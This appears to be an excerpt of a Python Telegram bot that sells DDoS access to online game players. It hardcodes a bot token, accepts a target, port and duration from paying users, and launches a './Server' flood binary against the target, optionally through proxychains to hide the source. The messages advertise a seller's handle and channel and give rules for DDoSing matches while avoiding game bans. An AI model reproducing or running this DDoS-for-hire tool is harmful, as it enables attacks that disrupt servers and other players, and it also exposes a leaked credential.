...
bot = telebot.TeleBot('7029774286:AAFVFnK_JeESwYUINcVk4-zSnfNEQUHwShU')
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 7000:
                ...
                if proxy:
                    full_command = f"proxychains4 -q ./Server {target} {port} {time}"
                    os.environ['PROXYCHAINS_PROXY'] = proxy
                else:
                    full_command = f"./Server {target} {port} {time}"
        ...
        response = "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @itzmd808sahil_SELLER 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"
...
🛒 𝐁𝐮𝐲 𝐅𝐫𝐨𝐦 :-\n𝟏.@itzmd808sahil_SELLER\n
🏫𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 :- @ https://t.me/+zCFtfTNDVQNiN2I1
'''
...
⚠️RULES TO HOW USE ARE PLAY THE GAME

NO:- 1 👇👇

Do ddos in 3 match after play 2 match normal or play 2 tdm match

NO:- 2 👇👇

Do less then 25 kills to avoid ban

NO:- 3 👇👇

After 1 or 2 match clear cache of your game

FOLLOW THIS RULES TO AVOID 1 MONTH BAN⚠️!!!'''
    bot.reply_to(message, response)
...
📽️ /video : 𝐃𝐞𝐭𝐚𝐢𝐥𝐞𝐝 𝐕𝐞𝐝𝐢𝐨 𝐇𝐨𝐰 𝐓𝐨 𝐃𝐃𝐨𝐒 𝐅𝐫𝐨𝐦 @itzmd808sahil_SELLER.
...
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐇𝐞𝐫𝐞'𝐬 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐃𝐞𝐭𝐚𝐢𝐥𝐞𝐝 𝐕𝐞𝐝𝐢𝐨 𝐇𝐨𝐰 𝐓𝐨 𝐃𝐃𝐨𝐒 𝐅𝐫𝐨𝐦 @itzmd808sahil_SELLER :\n@itzmd808sahil_SELLER'''
